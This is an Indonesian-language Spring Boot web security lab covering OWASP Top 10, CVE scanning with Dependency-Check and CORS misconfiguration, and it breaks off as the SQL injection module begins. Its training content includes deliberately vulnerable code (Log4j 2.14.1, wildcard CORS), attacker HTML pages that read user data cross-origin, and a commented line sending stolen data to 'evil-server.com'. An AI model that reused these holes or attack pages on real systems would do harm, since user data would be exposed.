# 🔐 Modul Hands-on Lab: Web Security dengan Spring Boot 3.2+ (Java 21)

> **Target Audience:** Developer / Mahasiswa Tingkat Menengah  
> **Stack:** Spring Boot 3.2+, Java 21, Thymeleaf, Bootstrap Admin, H2 Database, Spring Security  
> **Estimasi Durasi:** 8–10 Jam (4 Modul Lab)

---

## 📋 DAFTAR ISI

1. [Setup Awal Project](#modul-0-setup-awal-project)
2. [Modul 1 – OWASP Top 10: Pengenalan & Relevansi di Ekosistem Spring](#modul-1-owasp-top-10)
3. [Modul 2 – CVE: Deteksi & Mitigasi Dependency Vulnerability](#modul-2-cve-dependency-vulnerability)
4. [Modul 3 – CORS: Miskonfigurasi & Konfigurasi Aman](#modul-3-cors-cross-origin-resource-sharing)
5. [Modul 4 – SQL Injection: Simulasi Serangan & Pencegahan](#modul-4-sql-injection)

---

## MODUL 0: Setup Awal Project

### Prasyarat

Pastikan tools berikut sudah terinstall di mesin kamu:

| Tool | Versi Minimum | Cek Versi |
|------|--------------|-----------|
| JDK | 21 | `java -version` |
| Maven | 3.9+ | `mvn -version` |
| cURL | Any | `curl --version` |
| IDE | IntelliJ / VSCode | — |

---

### Struktur Project

```
websecurity-lab/
├── src/
│   ├── main/
│   │   ├── java/com/lab/security/
│   │   │   ├── WebSecurityLabApplication.java
│   │   │   ├── config/
│   │   │   │   └── SecurityConfig.java
│   │   │   ├── controller/
│   │   │   │   ├── UserController.java
│   │   │   │   └── ApiController.java
│   │   │   ├── entity/
│   │   │   │   └── User.java
│   │   │   ├── repository/
│   │   │   │   └── UserRepository.java
│   │   │   └── service/
│   │   │       └── UserService.java
│   │   └── resources/
│   │       ├── templates/
│   │       │   ├── layout.html
│   │       │   ├── index.html
│   │       │   └── users.html
│   │       ├── static/
│   │       │   └── css/
│   │       ├── application.properties
│   │       └── data.sql
│   └── test/
└── pom.xml
```

---

### `pom.xml` — Dependensi Lengkap

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
         https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>3.2.5</version>
        <relativePath/>
    </parent>

    <groupId>com.lab</groupId>
    <artifactId>websecurity-lab</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>WebSecurity Lab</name>
    <description>Hands-on Lab: Web Security dengan Spring Boot</description>

    <properties>
        <java.version>21</java.version>
    </properties>

    <dependencies>
        <!-- Spring Web MVC -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <!-- Spring Security -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-security</artifactId>
        </dependency>

        <!-- Thymeleaf Template Engine -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>

        <!-- Thymeleaf + Spring Security Integration -->
        <dependency>
            <groupId>org.thymeleaf.extras</groupId>
            <artifactId>thymeleaf-extras-springsecurity6</artifactId>
        </dependency>

        <!-- Spring Data JPA -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </dependency>

        <!-- H2 In-Memory Database (untuk simulasi lab) -->
        <dependency>
            <groupId>com.h2database</groupId>
            <artifactId>h2</artifactId>
            <scope>runtime</scope>
        </dependency>

        <!-- Validation -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-validation</artifactId>
        </dependency>

        <!-- Lombok (opsional, untuk boilerplate reduction) -->
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <optional>true</optional>
        </dependency>

        <!-- Spring Boot Test -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>

        <!-- Spring Security Test -->
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <configuration>
                    <excludes>
                        <exclude>
                            <groupId>org.projectlombok</groupId>
                            <artifactId>lombok</artifactId>
                        </exclude>
                    </excludes>
                </configuration>
            </plugin>

            <!-- OWASP Dependency-Check Plugin (untuk Modul 2) -->
            <plugin>
                <groupId>org.owasp</groupId>
                <artifactId>dependency-check-maven</artifactId>
                <version>9.1.0</version>
                <configuration>
                    <failBuildOnCVSS>7</failBuildOnCVSS>
                    <format>HTML</format>
                    <outputDirectory>${project.build.directory}/dependency-check-report</outputDirectory>
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <goal>check</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project>
```

---

### `application.properties` — Konfigurasi Dasar

```properties
# Server
server.port=8080

# H2 Database
spring.datasource.url=jdbc:h2:mem:securitylab;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE
spring.datasource.driver-class-name=org.h2.Driver
spring.datasource.username=sa
spring.datasource.password=

# H2 Console (aktifkan untuk debugging)
spring.h2.console.enabled=true
spring.h2.console.path=/h2-console

# JPA
spring.jpa.database-platform=org.hibernate.dialect.H2Dialect
spring.jpa.hibernate.ddl-auto=create-drop
spring.jpa.show-sql=true

# Initial data
spring.sql.init.mode=always
```

---

### `data.sql` — Data Awal untuk Lab

```sql
INSERT INTO users (id, username, email, password, role) VALUES
(1, 'admin', 'admin@lab.com', '$2a$10$N.zmdr9k7uOCQb376NoUnuTJ8iAt6Z5EHsM8lE9lBpwTTyGgGa9Gy', 'ADMIN'),
(2, 'alice', 'alice@lab.com', '$2a$10$N.zmdr9k7uOCQb376NoUnuTJ8iAt6Z5EHsM8lE9lBpwTTyGgGa9Gy', 'USER'),
(3, 'bob', 'bob@lab.com', '$2a$10$N.zmdr9k7uOCQb376NoUnuTJ8iAt6Z5EHsM8lE9lBpwTTyGgGa9Gy', 'USER');
-- Password untuk semua user: "password123"
```

---

### Entity & Repository Dasar

**`User.java`**

```java
package com.lab.security.entity;

import jakarta.persistence.*;
import lombok.Data;

@Entity
@Table(name = "users")
@Data
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(unique = true, nullable = false)
    private String username;

    @Column(nullable = false)
    private String email;

    @Column(nullable = false)
    private String password;

    @Column(nullable = false)
    private String role;
}
```

**`UserRepository.java`**

```java
package com.lab.security.repository;

import com.lab.security.entity.User;
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.stereotype.Repository;
import java.util.Optional;

@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByUsername(String username);
}
```

---

### Jalankan Project

```bash
# Clone / buat project baru
mvn spring-boot:run

# Akses di browser
# http://localhost:8080
# http://localhost:8080/h2-console
```

---

---

## MODUL 1: OWASP Top 10

### Apa Itu OWASP Top 10?

OWASP (Open Worldwide Application Security Project) merilis daftar **10 risiko keamanan web paling kritis** yang diperbarui secara berkala. Versi terkini adalah **OWASP Top 10 – 2021**.

---

### OWASP Top 10 (2021) dan Relevansinya di Spring Boot

| # | Kategori | Deskripsi Singkat | Relevansi di Spring |
|---|----------|-------------------|---------------------|
| A01 | **Broken Access Control** | Pengguna bisa mengakses resource yang seharusnya tidak boleh diakses | Salah konfigurasi `@PreAuthorize`, role-based access di Spring Security |
| A02 | **Cryptographic Failures** | Data sensitif tidak dienkripsi dengan benar | Password tidak di-hash dengan BCrypt, koneksi tanpa HTTPS |
| A03 | **Injection** | Input berbahaya dieksekusi sebagai perintah/query | SQL Injection via JPQL/Native Query, LDAP Injection |
| A04 | **Insecure Design** | Tidak ada mekanisme keamanan sejak tahap desain | Tidak ada rate limiting, tidak ada validasi input di layer service |
| A05 | **Security Misconfiguration** | Konfigurasi default tidak aman | H2 Console terbuka di production, CORS terlalu permisif, debug mode aktif |
| A06 | **Vulnerable & Outdated Components** | Library/dependency mengandung CVE | Menggunakan versi Spring/Log4j yang sudah ada CVE-nya |
| A07 | **Identification & Authentication Failures** | Mekanisme autentikasi lemah | Session fixation, password tidak di-hash, tidak ada brute-force protection |
| A08 | **Software & Data Integrity Failures** | Update atau CI/CD pipeline tidak diverifikasi | Dependency dari sumber tidak terpercaya tanpa checksum |
| A09 | **Security Logging & Monitoring Failures** | Tidak ada log untuk kejadian penting | Login gagal tidak di-log, tidak ada alerting |
| A10 | **Server-Side Request Forgery (SSRF)** | Server melakukan request ke URL yang dikontrol attacker | `RestTemplate` / `WebClient` dengan input URL dari user |

---

### Peta OWASP Top 10 → Lab yang Akan Kamu Kerjakan

```
OWASP A03: Injection          ──▶  Modul 4 (SQL Injection)
OWASP A05: Misconfiguration   ──▶  Modul 3 (CORS Misconfiguration)
OWASP A06: Vulnerable Comps   ──▶  Modul 2 (CVE Dependency-Check)
```

> **Catatan:** Modul-modul berikutnya merupakan implementasi langsung dari risiko OWASP yang relevan. Kamu tidak hanya belajar teori, tapi akan mensimulasikan serangan nyata dan memperbaikinya.

---

---

## MODUL 2: CVE Dependency Vulnerability

### TUJUAN BELAJAR

Setelah menyelesaikan lab ini, kamu akan mampu:
- Memahami apa itu CVE dan CVSS Score
- Mendeteksi dependency Spring Boot yang mengandung kerentanan menggunakan **OWASP Dependency-Check**
- Membaca laporan vulnerability dan memitigasi celah dengan upgrade/exclude dependency

---

### SKENARIO KERENTANAN

Bayangkan kamu join ke sebuah tim dan mewarisi project Spring Boot yang sudah lama tidak diupdate. Project ini masih menggunakan beberapa library lama. Salah satunya mungkin mengandung **CVE** — celah keamanan yang sudah terdokumentasi secara publik. Jika tidak dideteksi, attacker bisa mengeksploitasi library tersebut untuk melakukan Remote Code Execution (RCE), Data Breach, atau serangan lainnya.

**Contoh kasus nyata:**
- **CVE-2021-44228 (Log4Shell)** — RCE kritis pada Log4j 2.x yang mempengaruhi ratusan ribu aplikasi Java
- **CVE-2022-22965 (Spring4Shell)** — RCE pada Spring Framework sebelum versi 5.3.18

---

### VULNERABLE CODE

**Simulasi: Tambahkan dependency rentan (Log4j versi lama) ke `pom.xml`**

```xml
<!-- ⚠️ JANGAN GUNAKAN DI PRODUCTION! Ini hanya untuk simulasi lab -->
<!-- Tambahkan sementara dependency Log4j versi rentan -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>  <!-- ← Versi ini mengandung CVE-2021-44228 (Log4Shell) -->
</dependency>

<!-- Juga coba jackson-databind versi lama -->
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.9.8</version>  <!-- ← Versi ini mengandung beberapa CVE -->
</dependency>
```

> ⚠️ **PERINGATAN:** Kode di atas hanya untuk tujuan simulasi scanning. Jangan deploy ke environment production!

---

### EXPLOITATION STEP

Pada modul ini, "exploitation" adalah proses **mendeteksi** kerentanan yang ada. Kita akan menggunakan OWASP Dependency-Check untuk scan.

**Langkah 1: Pastikan plugin sudah ada di `pom.xml`**

```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.1.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
        <format>HTML</format>
        <outputDirectory>${project.build.directory}/dependency-check-report</outputDirectory>
    </configuration>
</plugin>
```

**Langkah 2: Jalankan scan**

```bash
# Jalankan dependency check (pertama kali akan download NVD database, bisa beberapa menit)
mvn dependency-check:check

# Atau untuk skip build failure dan hanya generate report:
mvn dependency-check:aggregate -DfailBuildOnCVSS=11
```

**Langkah 3: Lihat laporan hasil scan**

```bash
# Buka file report di browser
# Lokasi: target/dependency-check-report/dependency-check-report.html
open target/dependency-check-report/dependency-check-report.html
```

**Langkah 4: Analisis laporan**

Dalam laporan, kamu akan melihat:

```
╔══════════════════════════════════════════════════════════════╗
║ DEPENDENCY: log4j-core-2.14.1.jar                          ║
║ CVE-2021-44228    CVSS Score: 10.0 (CRITICAL)              ║
║ Description: Apache Log4j2 JNDI features do not protect    ║
║ against attacker controlled LDAP and other JNDI endpoints  ║
╚══════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════╗
║ DEPENDENCY: jackson-databind-2.9.8.jar                     ║
║ CVE-2019-17267    CVSS Score: 9.8 (CRITICAL)               ║
║ CVE-2019-14379    CVSS Score: 9.8 (CRITICAL)               ║
╚══════════════════════════════════════════════════════════════╝
```

**Langkah 5: Verifikasi via cURL ke NVD API (opsional)**

```bash
# Cek detail CVE-2021-44228 di NVD (National Vulnerability Database)
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228" \
  | python3 -m json.tool | grep -E "(cvssScore|description)"
```

---

### SECURE CODE FIX

**Langkah 1: Hapus atau upgrade dependency rentan**

```xml
<!-- SOLUSI 1: Hapus dependency berbahaya (jika tidak diperlukan) -->
<!-- Hapus seluruh blok dependency log4j-core versi lama -->

<!-- SOLUSI 2: Upgrade ke versi yang sudah dipatch -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.21.1</version>  <!-- ✅ Versi aman, sudah dipatch -->
</dependency>

<!-- Untuk jackson-databind, biarkan Spring Boot yang manage versinya -->
<!-- HAPUS penentuan versi manual, biarkan BOM Spring Boot yang kontrol -->
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <!-- Tidak perlu tulis <version> — Spring Boot BOM otomatis pilih versi aman -->
</dependency>
```

**Langkah 2: Konfigurasi Dependency-Check agar build gagal otomatis jika ada CVE kritis**

```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.1.0</version>
    <configuration>
        <!-- Build GAGAL jika ada CVE dengan CVSS Score >= 7 (High/Critical) -->
        <failBuildOnCVSS>7</failBuildOnCVSS>

        <!-- Format laporan: HTML + JSON untuk integrasi CI/CD -->
        <format>ALL</format>

        <!-- Lokasi output laporan -->
        <outputDirectory>${project.build.directory}/dependency-check-report</outputDirectory>

        <!-- Suppress false positive (jika diperlukan) -->
        <suppressionFiles>
            <suppressionFile>src/main/resources/dependency-check-suppressions.xml</suppressionFile>
        </suppressionFiles>

        <!-- Update NVD database setiap 4 jam -->
        <cveValidForHours>4</cveValidForHours>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

**Langkah 3: File suppression untuk false positive**

```xml
<!-- src/main/resources/dependency-check-suppressions.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<suppressions xmlns="https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd">
    <!--
        Contoh: Suppress false positive jika CVE tidak relevan dengan use case kita
        CATATAN: Selalu tambahkan justifikasi kenapa di-suppress!
    -->
    <!--
    <suppress>
        <notes>False positive: CVE ini hanya berlaku untuk konfigurasi X yang tidak kita gunakan</notes>
        <cve>CVE-XXXX-XXXXX</cve>
    </suppress>
    -->
</suppressions>
```

**Langkah 4: Integrasikan ke CI/CD Pipeline**

```yaml
# .github/workflows/security-scan.yml
name: Security Dependency Scan

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 6 * * 1'  # Setiap Senin pukul 06:00 UTC

jobs:
  dependency-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'

      - name: Run OWASP Dependency Check
        run: mvn dependency-check:check -DfailBuildOnCVSS=7
        env:
          NVD_API_KEY: ${{ secrets.NVD_API_KEY }}  # Optional tapi mempercepat download

      - name: Upload Report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: dependency-check-report
          path: target/dependency-check-report/
```

**Langkah 5: Verifikasi — Scan ulang setelah fix**

```bash
# Hapus dependency rentan, lalu scan ulang
mvn clean
mvn dependency-check:check

# Build seharusnya berhasil tanpa ada CVE critical yang terdeteksi
# BUILD SUCCESS ✅
```

---

### ANALISIS REVIU

**Mengapa pendekatan ini aman?**

**1. Spring Boot BOM (Bill of Materials) sebagai Safety Net**
Spring Boot menggunakan konsep BOM — sebuah "daftar belanja" versi library yang sudah diuji kompatibilitasnya DAN keamanannya. Dengan tidak menentukan versi dependency secara manual (untuk library yang sudah dikelola BOM), kamu otomatis mendapat versi yang aman ketika upgrade Spring Boot parent.

**2. Fail-Fast dengan `failBuildOnCVSS`**
Mengatur `failBuildOnCVSS=7` memastikan build otomatis gagal jika ada kerentanan High atau Critical. Ini mencegah kode bermasalah masuk ke production tanpa disadari.

**3. Scheduled Scan di CI/CD**
CVE baru bisa muncul kapan saja, bahkan untuk library yang dulu dianggap aman. Scan terjadwal (misalnya setiap Senin) memastikan tim langsung tahu jika ada kerentanan baru ditemukan pada dependency yang sudah ada.

**4. Suppression dengan Justifikasi**
Tidak semua CVE yang terdeteksi relevan dengan konteks aplikasimu. File suppression memungkinkan kamu mendokumentasikan dan mengecualikan false positive secara eksplisit, sehingga laporan tidak "noise" tapi tetap akurat.

---

---

## MODUL 3: CORS (Cross-Origin Resource Sharing)

### TUJUAN BELAJAR

Setelah menyelesaikan lab ini, kamu akan mampu:
- Memahami cara kerja mekanisme CORS di browser dan server
- Mengidentifikasi miskonfigurasi CORS yang umum di Spring Boot
- Mensimulasikan serangan akibat CORS yang terlalu permisif
- Mengimplementasikan konfigurasi CORS yang aman menggunakan Spring Security

---

### SKENARIO KERENTANAN

Kamu membangun REST API untuk aplikasi mobile banking. Frontend React-nya di-host di `https://app.mybank.com`. Seorang developer, karena frustasi dengan error CORS saat development, menambahkan `allowedOrigins("*")` ke konfigurasi. Config ini tidak sempat dihapus saat deploy ke production.

Sekarang, sebuah website jahat di `https://evil-site.com` bisa membuat request AJAX ke API kamu **atas nama user yang sedang login**, dan mencuri data transfer atau bahkan melakukan transaksi!

---

### VULNERABLE CODE

**Contoh 1: `@CrossOrigin` yang terlalu permisif di Controller**

```java
package com.lab.security.controller;

import org.springframework.web.bind.annotation.*;
import java.util.List;

// ❌ SALAH: Mengizinkan semua origin untuk endpoint sensitif
@RestController
@RequestMapping("/api/users")
@CrossOrigin(origins = "*", allowedHeaders = "*")  // ← BERBAHAYA!
public class UserApiController {

    @Autowired
    private UserService userService;

    // Endpoint ini bisa diakses dari domain MANAPUN!
    @GetMapping
    public List<User> getAllUsers() {
        return userService.findAll();
    }

    @GetMapping("/profile")
    public User getProfile(@RequestParam String username) {
        return userService.findByUsername(username);
    }
}
```

**Contoh 2: Global CORS config yang berbahaya di `SecurityConfig.java`**

```java
package com.lab.security.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;

@Configuration
public class VulnerableSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            // ... konfigurasi lain
            .build();
        return http.build();
    }

    // ❌ SANGAT BERBAHAYA: Semua origin, semua method, semua header diizinkan
    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();

        config.addAllowedOrigin("*");        // ← Bahaya #1: Semua domain
        config.addAllowedMethod("*");        // ← Bahaya #2: Semua HTTP method
        config.addAllowedHeader("*");        // ← Bahaya #3: Semua header
        config.setAllowCredentials(true);   // ← Bahaya #4: Ini bahkan TIDAK VALID
                                             //   (credentials=true + origin=* dilarang browser)
                                             //   tapi tetap menunjukkan niat yang salah

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);
        return source;
    }
}
```

---

### EXPLOITATION STEP

#### Simulasi 1: CORS Terlalu Terbuka (tanpa credentials)

Buka browser, buka DevTools Console (F12), dan jalankan script ini dari domain lain (gunakan `about:blank` atau buat HTML lokal):

**Buat file `evil-page.html` di mesin kamu:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Evil Attacker Page</title>
</head>
<body>
    <h2>🔴 Simulasi Halaman Attacker</h2>
    <p>Halaman ini mencoba mengambil data dari API target...</p>
    <pre id="output">Menunggu...</pre>

    <script>
        // Attacker mencoba fetch data dari API yang harusnya tidak bisa diakses
        fetch('http://localhost:8080/api/users', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            document.getElementById('output').textContent =
                '✅ BERHASIL! Data berhasil dicuri:\n' + JSON.stringify(data, null, 2);
            console.log('Stolen data:', data);
        })
        .catch(err => {
            document.getElementById('output').textContent =
                '❌ GAGAL (CORS blocking): ' + err.message;
        });
    </script>
</body>
</html>
```

```bash
# Serve file HTML ini dari port berbeda (simulasi "domain lain")
python3 -m http.server 9999
# Buka: http://localhost:9999/evil-page.html
```

#### Simulasi 2: Preflight Request Check via cURL

```bash
# Cek apakah server mengirim header CORS yang benar
# Simulasi Preflight (OPTIONS) request dari origin berbeda
curl -v -X OPTIONS http://localhost:8080/api/users \
  -H "Origin: https://evil-site.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Content-Type"

# Jika output mengandung:
# Access-Control-Allow-Origin: *
# → Server terlalu permisif! ❌

# Jika output mengandung:
# Access-Control-Allow-Origin: https://app.mybank.com  (atau tidak ada header ini)
# → Server sudah dikonfigurasi dengan benar ✅
```

#### Simulasi 3: CORS dengan Credentials (Kasus Paling Berbahaya)

```html
<!-- evil-page-with-credentials.html -->
<script>
    // Ini mencoba mengirim request DENGAN cookie/credentials user yang sudah login
    fetch('http://localhost:8080/api/users/profile?username=admin', {
        method: 'GET',
        credentials: 'include',  // ← Sertakan cookie session user!
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(r => r.json())
    .then(data => {
        // Jika berhasil, attacker mendapat data profil user yang sedang login
        console.log('Profile data stolen:', data);
        // Kemudian bisa di-exfiltrate ke server attacker:
        // fetch('https://evil-server.com/collect', { method: 'POST', body: JSON.stringify(data) })
    });
</script>
```

```bash
# Verifikasi juga dengan cURL untuk melihat response header
curl -v http://localhost:8080/api/users \
  -H "Origin: https://evil-site.com" \
  -H "Cookie: JSESSIONID=some-session-id"
```

---

### SECURE CODE FIX

**`SecurityConfig.java` — Konfigurasi CORS yang Aman**

```java
package com.lab.security.config;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import java.util.Arrays;
import java.util.List;

@Configuration
@EnableWebSecurity
public class SecureSecurityConfig {

    // Ambil allowed origins dari application.properties (bukan hardcode)
    @Value("${app.cors.allowed-origins}")
    private List<String> allowedOrigins;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // ✅ Aktifkan CORS dengan konfigurasi yang sudah kita definisikan
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))

            // ✅ Aktifkan CSRF protection (penting untuk web app dengan session)
            .csrf(csrf -> csrf
                .ignoringRequestMatchers("/api/public/**")  // Hanya untuk endpoint publik
            )

            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login", "/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )

            .formLogin(form -> form
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard", true)
                .permitAll()
            )

            .logout(logout -> logout
                .logoutSuccessUrl("/login?logout")
                .invalidateHttpSession(true)
                .deleteCookies("JSESSIONID")
                .permitAll()
            );

        return http.build();
    }

    // ✅ Konfigurasi CORS yang aman dan eksplisit
    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();

        // ✅ HANYA izinkan origin yang spesifik dan terpercaya
        // TIDAK boleh menggunakan "*" jika allowCredentials = true
        config.setAllowedOrigins(allowedOrigins);
        // Contoh: ["https://app.mybank.com", "https://admin.mybank.com"]

        // ✅ Izinkan hanya HTTP method yang benar-benar dibutuhkan
        config.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));

        // ✅ Izinkan hanya header yang diperlukan
        config.setAllowedHeaders(Arrays.asList(
            "Authorization",
            "Content-Type",
            "X-Requested-With",
            "Accept",
            "Origin"
        ));

        // ✅ Header yang boleh dibaca oleh browser dari response
        config.setExposedHeaders(Arrays.asList(
            "Authorization",
            "X-Custom-Header"
        ));

        // ✅ Izinkan credentials (cookie/session) HANYA jika origin sudah spesifik
        config.setAllowCredentials(true);

        // ✅ Cache preflight request selama 1 jam (3600 detik) untuk efisiensi
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();

        // ✅ Terapkan konfigurasi CORS hanya untuk path /api/**
        // Path lain (halaman HTML) tidak perlu CORS
        source.registerCorsConfiguration("/api/**", config);

        return source;
    }
}
```

**`application.properties` — Konfigurasi Origin per Environment**

```properties
# Development
app.cors.allowed-origins=http://localhost:3000,http://localhost:4200

# Production (gunakan environment variable atau Spring Profiles)
# app.cors.allowed-origins=https://app.mybank.com,https://admin.mybank.com
```

**`application-prod.properties` — Konfigurasi Production**

```properties
# Override untuk environment production
app.cors.allowed-origins=https://app.mybank.com,https://admin.mybank.com
```

**Controller yang Sudah Diperbaiki — Tanpa `@CrossOrigin`**

```java
package com.lab.security.controller;

import org.springframework.web.bind.annotation.*;
import java.util.List;

// ✅ TIDAK menggunakan @CrossOrigin di level controller
// Konfigurasi CORS sudah dihandle secara terpusat di SecurityConfig
@RestController
@RequestMapping("/api/users")
public class UserApiController {

    @Autowired
    private UserService userService;

    @GetMapping
    public List<User> getAllUsers() {
        return userService.findAll();
    }

    @GetMapping("/profile")
    public User getProfile(@RequestParam String username) {
        return userService.findByUsername(username);
    }
}
```

**Verifikasi Fix dengan cURL**

```bash
# Test 1: Request dari origin yang DIIZINKAN
curl -v http://localhost:8080/api/users \
  -H "Origin: http://localhost:3000"

# Output yang diharapkan:
# Access-Control-Allow-Origin: http://localhost:3000  ✅

# Test 2: Request dari origin yang TIDAK DIIZINKAN
curl -v http://localhost:8080/api/users \
  -H "Origin: https://evil-site.com"

# Output yang diharapkan:
# (Tidak ada header Access-Control-Allow-Origin)  ✅
# Browser akan memblokir request ini!

# Test 3: Preflight dari origin tidak diizinkan
curl -v -X OPTIONS http://localhost:8080/api/users \
  -H "Origin: https://evil-site.com" \
  -H "Access-Control-Request-Method: GET"

# Output yang diharapkan:
# HTTP/1.1 403 Forbidden  ✅
```

---

### ANALISIS REVIU

**Mengapa konfigurasi ini aman?**

**1. Origin Whitelist yang Eksplisit**
Dengan mendefinisikan daftar origin yang diizinkan secara eksplisit (`setAllowedOrigins(allowedOrigins)`), server hanya merespons request dari domain terpercaya. Browser akan memblokir semua request dari origin lain sebelum data dikirim.

**2. `allowCredentials=true` + Origin Spesifik = Perlindungan CSRF**
Kombinasi `allowCredentials(true)` dengan daftar origin spesifik adalah konfigurasi paling kritis. Browser menolak untuk mengirimkan cookie/session ke server jika origin tidak cocok dengan yang dikonfigurasi, sehingga serangan CSRF via CORS tidak bisa dilakukan.

**3. Konfigurasi Terpusat di `SecurityConfig`**
Daripada menyebar `@CrossOrigin` di setiap controller (yang rawan terlewat atau salah konfigurasi), satu konfigurasi global di `SecurityConfig` memastikan konsistensi dan memudahkan audit.

**4. Method & Header Eksplisit**
Hanya method (`GET`, `POST`, dll.) dan header yang benar-benar dibutuhkan yang diizinkan. Ini menerapkan prinsip **least privilege** — berikan izin sesedikit mungkin.

**5. Konfigurasi per Environment**
Menggunakan `@Value` dan Spring Profiles memungkinkan kamu menggunakan origin `localhost` saat development, tapi otomatis beralih ke origin production ketika deploy, tanpa perlu ubah kode.

---

---

## MODUL 4: SQL Injection

### TUJUAN BELAJAR

Setelah menyelesaikan lab ini, kamu akan mampu:
- Memahami bagaimana SQL Injection bekerja di aplikasi Spring Boot
- Mensimulasikan serangan SQLi pada JPQL dan Native Query yang rentan
- Mencegah SQLi menggunakan Spring Data JPA dengan Parameterized Query
- Menerapkan validasi input sebagai defense-in-depth

---

### SKENARIO KERENTANAN

Sebuah aplikasi manajemen karyawan punya fitur pencarian: "Cari user berdasarkan nama". Developer junior yang terburu-buru membuat query dengan cara string concatenation — langsung menggabungkan input user ke dalam query SQL. Ini membuka pintu lebar-lebar untuk attacker memanipulasi logika database, mengekstrak semua data, bahkan bisa menghapus tabel!

---

### VULNERABLE CODE

**Contoh 1: Native Query Rentan (String Concatenation)**

```java
package com.lab.security.repository;

import com.lab.security.entity.User;
import jakarta.persistence.EntityManager;
import jakarta.persistence.PersistenceContext;
import org.springframework.stereotype.Repository;
import java.util.List;

@Repository
public class VulnerableUserRepository {

    @PersistenceContext
    private EntityManager entityManager;

    // ❌ SANGAT RENTAN: Input user langsung digabung ke query!
    public List<User> searchByUsernameVulnerable(String username) {
